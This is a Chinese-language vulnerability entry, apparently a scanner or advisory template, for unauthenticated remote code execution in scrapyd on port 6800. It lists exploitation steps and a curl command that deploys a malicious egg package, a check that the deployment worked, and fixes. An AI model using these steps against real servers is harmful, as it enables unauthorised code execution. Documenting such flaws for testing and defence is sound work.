---
id: SCRAPY-SCRAPYD-UNACC
title: scrapyd 未授权访问导致远程代码执行漏洞
product: scrapy
vendor: scrapy
version_affected: "全版本"
severity: CRITICAL
tags: [rce, 无需认证]
fingerprint: ["scrapyd", "Scrapy"]
---

## 漏洞描述

scrapyd是爬虫框架scrapy提供的云服务，用户可以部署自己的scrapy包到云服务，默认监听在6800端口。如果攻击者能访问该端口，将可以部署恶意代码到服务器，进而获取服务器权限。

## 影响版本

- 全版本

## 前置条件

- 无需认证
- 需要能够访问 scrapyd 的 6800 端口

## 利用步骤

1. 安装 scrapy 和 scrapyd-client：`pip install scrapy scrapyd-client`
2. 创建恶意 scrapy 项目：`scrapy startproject evil`
3. 编辑 evil/__init__.py 加入恶意代码
4. 打包：`scrapyd-deploy --build-egg=evil.egg`
5. 向 API 接口发送恶意包部署

## Payload

```bash
# 部署恶意 egg 包
curl http://target:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
```

## 验证方法

```bash
# 检查是否成功部署
curl http://target:6800/listprojects.json
```

## 修复建议

1. 开启 scrapyd 认证
2. 限制 6800 端口访问来源
3. 使用防火墙保护 scrapyd 端口
